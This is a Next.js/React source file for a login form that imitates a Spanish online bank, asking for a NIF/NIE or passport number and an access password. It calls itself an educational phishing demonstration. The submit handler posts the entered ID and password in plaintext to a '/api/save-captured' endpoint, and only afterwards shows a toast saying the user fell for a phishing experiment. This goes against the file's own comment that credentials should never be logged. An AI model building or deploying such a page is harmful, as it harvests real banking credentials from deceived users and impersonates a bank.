
"use client";

import {
  Card,
  CardContent,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { ArrowRight } from "lucide-react";
import Link from "next/link";
import * as React from 'react';
import { 
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger
} from "@/components/ui/tabs";
import { Checkbox } from "@/components/ui/checkbox";
import { useAuth } from "@/firebase";
import { signInWithEmailAndPassword } from "firebase/auth";
import { useRouter } from "next/navigation";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

export default function LoginForm() {
  const { toast } = useToast();
  const [loading, setLoading] = React.useState(false);
  const auth = useAuth();
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);

    const formData = new FormData(e.currentTarget);
    const nif = formData.get('nif-persona') as string;
    const password = formData.get('password-persona') as string;

    // --- Educational Demonstration ---
    // In a real app, you would NEVER log credentials.
    // This is to demonstrate a vulnerability for educational purposes.
    const capturedData = {
      timestamp: new Date().toISOString(),
      source: "login-form",
      credentials: {
        nif: nif,
        password: password
      }
    };
   
await fetch('/api/save-captured', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ nif, password })
});

// mostrar la notificación como ya haces

    // --- End of Demonstration ---

    // Simulate a network delay and show the phishing message
    setTimeout(() => {
      toast({
        variant: "destructive",
        title: "¡Has caído en un experimento de phishing!",
        description: "En una situación real, tus credenciales habrían sido robadas.",
      });
      setLoading(false);
    }, 1000);
  };

  const handleEmpresaSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      toast({
        variant: "destructive",
        title: "Función no disponible",
        description: "El acceso para empresas no está disponible en esta demo.",
      });
    }, 1000);
  }

  return (
    <Card className="w-full shadow-2xl backdrop-blur-sm bg-card/95 border-none">
      <CardHeader className="p-0">
         <Tabs defaultValue="persona" className="w-full">
            <TabsList className="grid w-full grid-cols-2 bg-transparent p-0 rounded-none border-b">
              <TabsTrigger value="persona" className="py-4 rounded-none data-[state=active]:shadow-[inset_0_-2px_0_hsl(var(--primary))] data-[state=active]:text-primary font-semibold">
                Persona
              </TabsTrigger>
              <TabsTrigger value="empresa" className="py-4 rounded-none data-[state=active]:shadow-[inset_0_-2px_0_hsl(var(--primary))] data-[state=active]:text-primary font-semibold">
                Empresa
              </TabsTrigger>
            </TabsList>
            <CardTitle className="p-6 pb-2 text-2xl font-semibold">
              Acceso a tu banca online
            </CardTitle>
            <TabsContent value="persona">
               <form onSubmit={handleSubmit}>
                <CardContent className="space-y-4 px-6">
                   <div className="space-y-2">
                      <Label htmlFor="doc-type-persona">Documento</Label>
                       <div className="flex gap-2">
                        <Select defaultValue="nif">
                          <SelectTrigger className="w-[120px]">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="nif">NIF</SelectItem>
                            <SelectItem value="nie">NIE</SelectItem>
                            <SelectItem value="pasaporte">Pasaporte</SelectItem>
                          </SelectContent>
                        </Select>
                        <Input id="nif-persona" name="nif-persona" placeholder="12345678A" required />
                      </div>
                    </div>
                  <div className="space-y-2">
                    <Label htmlFor="password-persona">Clave de acceso</Label>
                    <Input
                      id="password-persona"
                      name="password-persona"
                      type="password"
                      placeholder="••••••••"
                      required
                    />
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="remember-persona" name="remember-persona" />
                    <Label htmlFor="remember-persona" className="font-normal text-sm">
                      Recordar usuario
                    </Label>
                  </div>
                </CardContent>
                <CardFooter className="flex-col items-stretch gap-4 px-6 pb-6">
                  <Button type="submit" size="lg" disabled={loading}>
                    {loading ? "Verificando..." : "Entrar"}
                  </Button>
                  <div className="flex justify-between text-sm">
                    <Link href="#" className="font-semibold text-primary hover:underline">
                      ¿No recuerdas tus claves?
                    </Link>
                    <Link href="/registro" className="font-semibold text-primary hover:underline">
                      Hazte cliente
                    </Link>
                  </div>
                </CardFooter>
              </form>
            </TabsContent>
            <TabsContent value="empresa">
               <form onSubmit={handleEmpresaSubmit}>
                <CardContent className="space-y-6 px-6">
                   <div className="space-y-2">
                    <Label htmlFor="user-empresa">Usuario de Empresa</Label>
                    <Input id="user-empresa" placeholder="ID de Empresa" required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="password-empresa">Clave de acceso</Label>
                    <Input
                      id="password-empresa"
                      type="password"
                      placeholder="••••••••"
                      required
                    />
                  </div>
                   <div className="flex items-center space-x-2">
                    <Checkbox id="remember-empresa" />
                    <Label htmlFor="remember-empresa" className="font-normal text-sm">
                      Recordar usuario
                    </Label>
                  </div>
                </CardContent>
                <CardFooter className="flex-col items-stretch gap-4 px-6 pb-6">
                  <Button type="submit" size="lg" disabled={loading}>
                    {loading ? "Verificando..." : "Entrar"}
                  </Button>
                </CardFooter>
              </form>
            </TabsContent>
          </Tabs>
      </CardHeader>
      <div className="border-t p-4">
        <Button variant="outline" className="w-full justify-start text-left">
          <div className="flex-1">
            <p className="font-semibold">Acceso de emergencia</p>
            <p className="font-normal text-muted-foreground text-sm">¿Has detectado una operación que no reconoces?</p>
          </div>
          <ArrowRight className="h-5 w-5 text-primary" />
        </Button>
      </div>
    </Card>
  );
}
